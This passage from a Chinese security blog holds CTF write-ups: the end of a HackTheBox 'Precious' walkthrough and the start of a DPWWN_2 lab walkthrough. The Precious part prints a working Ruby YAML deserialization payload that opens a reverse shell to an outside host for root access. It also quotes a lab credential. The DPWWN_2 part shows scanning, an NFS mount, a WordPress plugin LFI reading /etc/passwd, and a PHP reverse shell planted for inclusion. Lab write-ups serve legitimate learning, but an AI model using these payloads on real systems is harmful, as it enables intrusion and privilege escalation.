ruby 运行 <code>/opt/update_dependencies.rb</code>，而这个 rb 脚本中又加载了 <code>dependencies.yml</code> 文件，根据文件名可以大概判断出，这是个检查依赖和版本的脚本，去谷歌一下看看有没有 exp，先使用 chatgpt 补一下这方面的基础知识</p><p><img src="/pic/faef269b7f0360921bafda8fc154b011_MD5.png"></p><p>得到一个关键词 <code>包管理器</code></p><p><img src="/pic/c3a89d3cfd2dda690463e709f8a9cc16_MD5.png"></p><h3 id="YAML-反序列化"><a href="#YAML-反序列化" class="headerlink" title="YAML 反序列化"></a>YAML 反序列化</h3><p><code>RubyGems</code> 借助于这个关键词和 <code>yaml</code> 关键词来谷歌 exp</p><p><img src="/pic/d77d191431a3a84226bb0edad1b8a202_MD5.png"></p><p>yaml 反序列化，或许这就是我需要的，依次查看，在第二个链接中找到了exp <a href="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/">Blind Remote Code Execution through YAML Deserialization (stratumsecurity.com)</a></p><p><img src="/pic/305bd872ef1ffc72c63ddeea1f67b9f1_MD5.png"></p><p>修改其中反弹 shell 的目标地址和端口号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">---<br>- !ruby/object:Gem::Installer<br>    i: x<br>- !ruby/object:Gem::SpecFetcher<br>    i: y<br>- !ruby/object:Gem::Requirement<br>  requirements:<br>    !ruby/object:Gem::Package::TarReader<br>    io: &amp;1 !ruby/object:Net::BufferedIO<br>      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry<br>         <span class="hljs-built_in">read</span>: 0<br>         header: <span class="hljs-string">&quot;abc&quot;</span><br>      debug_output: &amp;1 !ruby/object:Net::WriteAdapter<br>         socket: &amp;1 !ruby/object:Gem::RequestSet<br>             sets: !ruby/object:Net::WriteAdapter<br>                 socket: !ruby/module <span class="hljs-string">&#x27;Kernel&#x27;</span><br>                 method_id: :system<br>             git_set: <span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/reverseshell.stratumsecurity.com/443 0&gt;&amp;1&#x27;&quot;</span><br>         method_id: :resolve<br></code></pre></td></tr></table></figure><p>修改后写入&#x2F;tmp 下的 <code>dependencies.yml</code> 文件，提前本机开启监听，然后 sudo 命令运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">henry@precious:/tmp$ vim dependencies.yml<br>henry@precious:/tmp$ sudo /usr/bin/ruby /opt/update_dependencies.rb<br>sh: 1: reading: not found<br></code></pre></td></tr></table></figure><p>反弹成功，找&#x2F;root 下的 flag，定妆照结束战斗</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/precious]<br>└─$ sudo nc -lvnp 443<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.1.1.128] from (UNKNOWN) [192.1.1.129] 53450<br>root@precious:/tmp<span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br>root@precious:/tmp<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>root@precious:~<span class="hljs-comment"># cat root.txt</span><br><span class="hljs-built_in">cat</span> root.txt<br>root@precious:~<span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:2f:d8:2a brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.129/24 brd 192.1.1.255 scope global dynamic ens33<br>       valid_lft 1429sec preferred_lft 1429sec<br>    inet6 fe80::20c:29ff:fe2f:d82a/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@precious:~<span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux precious 5.4.0-150-generic <span class="hljs-comment">#167-Ubuntu SMP Mon May 15 17:35:05 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><br></code></pre></td></tr></table></figure><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="bundle-目录中为什么有用户名和密码"><a href="#bundle-目录中为什么有用户名和密码" class="headerlink" title=".bundle 目录中为什么有用户名和密码"></a>.bundle 目录中为什么有用户名和密码</h3><blockquote><p>在⽤户⽬录下的 .bundle ⽂件夹中的 config ⽂件是⽤于配置 Bundler（⼀个与 Gem 相关的 ⼯具）的⽂件。Bundler 是⼀个⽤于管理 Ruby 应⽤程序的依赖关系的⼯具，它允许你指 定应⽤程序所需的 Gem 的版本和来源。 该⽂件中的内容是 Bundler 的配置信息。具体来说， BUNDLE_HTTPS:&#x2F;&#x2F;RUBYGEMS__ORG&#x2F; 是⼀个 环境变量，它告诉 Bundler 在下载 Gems 时使⽤的 RubyGems 源的 URL。在这个例⼦ 中，源的 URL 是 <a href="https://rubygems.org/">https://rubygems.org/</a> ，这是 RubyGems 的官⽅源。 HTB - Precious 2 “henry:Q3c1AqGHtoI0aXAYFH” 是⼀个⽤户名和密码的组合，⽤于访问 RubyGems 源时的⾝份 验证。这⾥的⽤户名是 “henry”，密码是 “Q3c1AqGHtoI0aXAYFH”。这样配置的⽬的是 让 Bundler 在从 RubyGems 源下载 Gems 时⾃动进⾏⾝份验证，以便获取所需的 Gems。 通过配置⽂件，你可以指定不同的源和⾝份验证信息，以适应不同的开发环境和需求。这 使得团队合作或在不同计算机上共享项⽬时更加⽅便，因为所有⼈都可以使⽤相同的 Bundler 配置来获取所需的 Gems。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>hackthebox</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DPWWN_2 靶机</title>
    <link href="/2023/06/4a8e45e98015.html"/>
    <url>/2023/06/4a8e45e98015.html</url>
    
    <content type="html"><![CDATA[<h1 id="DPWWN-2-靶机"><a href="#DPWWN-2-靶机" class="headerlink" title="DPWWN_2 靶机"></a>DPWWN_2 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 10.10.10.10                    <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-28 22:59 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.10<br>Host is up (0.00053s latency).<br>Not shown: 65527 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>80/tcp    open  http<br>111/tcp   open  rpcbind<br>443/tcp   open  https<br>2049/tcp  open  nfs<br>40933/tcp open  unknown<br>42973/tcp open  unknown<br>44923/tcp open  unknown<br>48347/tcp open  unknown<br>MAC Address: 00:0C:29:61:24:B2 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.87 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/tmp]<br>└─$ sudo nmap --top-ports 20 -sU 10.10.10.10                     <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-28 23:27 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.10<br>Host is up (0.00032s latency).<br><br>PORT      STATE  SERVICE<br>53/udp    closed domain<br>67/udp    closed dhcps<br>68/udp    closed dhcpc<br>69/udp    closed tftp<br>123/udp   closed ntp<br>135/udp   closed msrpc<br>137/udp   closed netbios-ns<br>138/udp   closed netbios-dgm<br>139/udp   closed netbios-ssn<br>161/udp   closed snmp<br>162/udp   closed snmptrap<br>445/udp   closed microsoft-ds<br>500/udp   closed isakmp<br>514/udp   closed syslog<br>520/udp   closed route<br>631/udp   closed ipp<br>1434/udp  closed ms-sql-m<br>1900/udp  closed upnp<br>4500/udp  closed nat-t-ike<br>49152/udp closed unknown<br>MAC Address: 00:0C:29:61:24:B2 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 23.63 seconds<br></code></pre></td></tr></table></figure><p>开放了 80,111,443,2049,40933,42973,44923,48347 端口，没有 22 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p80,111,443,2049,40933,42973,44923,48347 10.10.10.10   <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-28 23:01 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.10<br>Host is up (0.00038s latency).<br><br>PORT      STATE SERVICE  VERSION<br>80/tcp    open  http     Apache httpd 2.4.38 ((Ubuntu))<br>|_http-title: dpwwn-02<br>|_http-server-header: Apache/2.4.38 (Ubuntu)<br>111/tcp   open  rpcbind  2-4 (RPC <span class="hljs-comment">#100000)</span><br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100003  3           2049/udp   nfs<br>|   100003  3           2049/udp6  nfs<br>|   100003  3,4         2049/tcp   nfs<br>|   100003  3,4         2049/tcp6  nfs<br>|   100005  1,2,3      34176/udp   mountd<br>|   100005  1,2,3      34527/udp6  mountd<br>|   100005  1,2,3      42973/tcp   mountd<br>|   100005  1,2,3      59857/tcp6  mountd<br>|   100021  1,3,4      37005/tcp6  nlockmgr<br>|   100021  1,3,4      40564/udp6  nlockmgr<br>|   100021  1,3,4      40933/tcp   nlockmgr<br>|   100021  1,3,4      41906/udp   nlockmgr<br>|   100227  3           2049/tcp   nfs_acl<br>|   100227  3           2049/tcp6  nfs_acl<br>|   100227  3           2049/udp   nfs_acl<br>|_  100227  3           2049/udp6  nfs_acl<br>443/tcp   open  http     Apache httpd 2.4.38 ((Ubuntu))<br>|_http-title: dpwwn-02<br>|_http-server-header: Apache/2.4.38 (Ubuntu)<br>2049/tcp  open  nfs      3-4 (RPC <span class="hljs-comment">#100003)</span><br>40933/tcp open  nlockmgr 1-4 (RPC <span class="hljs-comment">#100021)</span><br>42973/tcp open  mountd   1-3 (RPC <span class="hljs-comment">#100005)</span><br>44923/tcp open  mountd   1-3 (RPC <span class="hljs-comment">#100005)</span><br>48347/tcp open  mountd   1-3 (RPC <span class="hljs-comment">#100005)</span><br>MAC Address: 00:0C:29:61:24:B2 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 19.37 seconds<br><br></code></pre></td></tr></table></figure><p>五位数的端口都是 rpc 调用的，重点放在 80，443，2049</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p80,111,443,2049,40933,42973,44923,48347 10.10.10.10<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-28 23:26 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.10<br>Host is up (0.00044s latency).<br><br>PORT      STATE SERVICE<br>80/tcp    open  http<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-stored-xss: Couldn\&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /wordpress/: Blog</span><br><span class="hljs-string">|_  /wordpress/wp-login.php: Wordpress login page.</span><br><span class="hljs-string">111/tcp   open  rpcbind</span><br><span class="hljs-string">443/tcp   open  https</span><br><span class="hljs-string">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-stored-xss: Couldn\&#x27;</span>t find any stored XSS vulnerabilities.<br>|_ssl-ccs-injection: No reply from server (TIMEOUT)<br>| http-enum: <br>|   /wordpress/: Blog<br>|_  /wordpress/wp-login.php: Wordpress login page.<br>2049/tcp  open  nfs<br>40933/tcp open  unknown<br>42973/tcp open  unknown<br>44923/tcp open  unknown<br>48347/tcp open  unknown<br>MAC Address: 00:0C:29:61:24:B2 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 82.97 seconds<br></code></pre></td></tr></table></figure><p>漏洞脚本的扫描结果中显示了 <code>/wordpress/</code> 目录，而且 80 端口和 443 端口的扫描结果是相同的，猜测两个端口提供的 Web 服务是相同的。先来挂载一下 nfs，再用 wpscan 扫描一下</p><h2 id="nfs-挂载"><a href="#nfs-挂载" class="headerlink" title="nfs 挂载"></a>nfs 挂载</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ showmount -e 10.10.10.10                                                      <br>Export list <span class="hljs-keyword">for</span> 10.10.10.10:<br>/home/dpwwn02 (everyone)<br><br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">mkdir</span> /tmp/infosec<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo mount -t nfs 10.10.10.10:/home/dpwwn02 /tmp/infosec<br><br></code></pre></td></tr></table></figure><p>挂载成功，进去看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/tmp/infosec]<br>└─$ <span class="hljs-built_in">ls</span> -liah                                                   <br>total 16K<br> 405869 drwxr-xr-x  2 nobody nogroup 4.0K Aug  8  2019 .<br>4194305 drwxrwxrwt 17 root   root     12K Jun 28 23:05 ..<br><br></code></pre></td></tr></table></figure><p>空空如也？先搁置吧，想到了之前可以在家目录下写 .ssh 文件然后放公钥的情况。不过这个没开放 22 端口。不管了， wpscan 看看吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ wpscan --url http://10.10.10.10/wordpress -eap                                                       <br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` |  _ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.24<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[i] It seems like you have not updated the database <span class="hljs-keyword">for</span> some time.<br>[?] Do you want to update now? [Y]es [N]o, default: [N]n<br>[+] URL: http://10.10.10.10/wordpress/ [10.10.10.10]<br>[+] Started: Thu Jun 29 01:45:09 2023<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entry: Server: Apache/2.4.38 (Ubuntu)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://10.10.10.10/wordpress/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://10.10.10.10/wordpress/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] Upload directory has listing enabled: http://10.10.10.10/wordpress/wp-content/uploads/<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://10.10.10.10/wordpress/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://10.10.10.10/wordpress/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.2&lt;/generator&gt;<br> |  - http://10.10.10.10/wordpress/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.2&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentynineteen<br> | Location: http://10.10.10.10/wordpress/wp-content/themes/twentynineteen/<br> | Last Updated: 2023-03-29T00:00:00.000Z<br> | Readme: http://10.10.10.10/wordpress/wp-content/themes/twentynineteen/readme.txt<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 2.5<br> | Style URL: http://10.10.10.10/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4<br> | Style Name: Twenty Nineteen<br> | Style URI: https://wordpress.org/themes/twentynineteen/<br> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> |<br> | Version: 1.4 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://10.10.10.10/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: <span class="hljs-string">&#x27;Version: 1.4&#x27;</span><br><br>[+] Enumerating All Plugins (via Passive Methods)<br>[+] Checking Plugin Versions (via Passive and Aggressive Methods)<br><br>[i] Plugin(s) Identified:<br><br>[+] site-editor<br> | Location: http://10.10.10.10/wordpress/wp-content/plugins/site-editor/<br> | Latest Version: 1.1.1 (up to <span class="hljs-built_in">date</span>)<br> | Last Updated: 2017-05-02T23:34:00.000Z<br> |<br> | Found By: Urls In Homepage (Passive Detection)<br> |<br> | Version: 1.1.1 (80% confidence)<br> | Found By: Readme - Stable Tag (Aggressive Detection)<br> |  - http://10.10.10.10/wordpress/wp-content/plugins/site-editor/readme.txt<br><br>[!] No WPScan API Token given, as a result vulnerability data has not been output.<br>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register<br><br>[+] Finished: Thu Jun 29 01:45:14 2023<br>[+] Requests Done: 33<br>[+] Cached Requests: 5<br>[+] Data Sent: 8.53 KB<br>[+] Data Received: 484.481 KB<br>[+] Memory used: 241.328 MB<br>[+] Elapsed time: 00:00:04<br></code></pre></td></tr></table></figure><p>插件中有个 <code>site-editor</code>，搜索 <code>wordpress site-editor</code>，在 <code>exploit db</code> 中搜到了一个本地文件包含漏洞</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">http://&lt;host&gt;/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/pic/9775558c60725c5a8732ea3df263d806_MD5.png"></p><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>尝试利用上述 PoC 进行验证</p><p><img src="/pic/53ceec980c671b02cb2cff8cdd5d2b5e_MD5.png"></p><p>接下来我尝试访问 wp-config.php ，但似乎 php 文件会被解析，所以返回错误</p><p><img src="/pic/21114f0f97e495a663206a883f19b5a8_MD5.png"></p><p>接下来我尝试直接爆破登录，以及搜索 wordpress 5.2 和 wordpress 5.2.2 的漏洞，爆破了十几分钟都没成功，感觉直接爆破可能并不能拿到密码。这里想了很久，看了眼 WP 才意识到只需要在 nfs 挂载的目录中写入 php 文件，然后本地文件包含去访问就行了，过去打靶偏向于单一漏洞去 getshell，这次也是个提醒，要注意不同漏洞或者访问的联动性，getshell 是一个综合的过程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dpwwn02]<br>└─$ vim php-reverse-shell.php<br></code></pre></td></tr></table></figure><p>修改一下 reverse-shell 然后将其拷贝到挂载的目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp/infosec]<br>└─<span class="hljs-comment"># cp /home/kali/Downloads/dpwwn02/php-reverse-shell.php ./</span><br><br>┌──(root㉿kali)-[/tmp/infosec]<br>└─<span class="hljs-comment"># ls</span><br>php-reverse-shell.php<br><br>┌──(root㉿kali)-[/tmp/infosec]<br>└─<span class="hljs-comment"># ls -liah                                                </span><br>total 20K<br> 405869 drwxr-xr-x  2 nobody nogroup 4.0K Jun 29 03:25 .<br>4194305 drwxrwxrwt 18 root   root     12K Jun 29 03:09 ..<br> 407201 -rwxr-xr-x  1 nobody nogroup 3.4K Jun 29 03:25 php-reverse-shell.php<br></code></pre></td></tr></table></figure><h2 id="本地文件包含-文件上传getshell"><a href="#本地文件包含-文件上传getshell" class="headerlink" 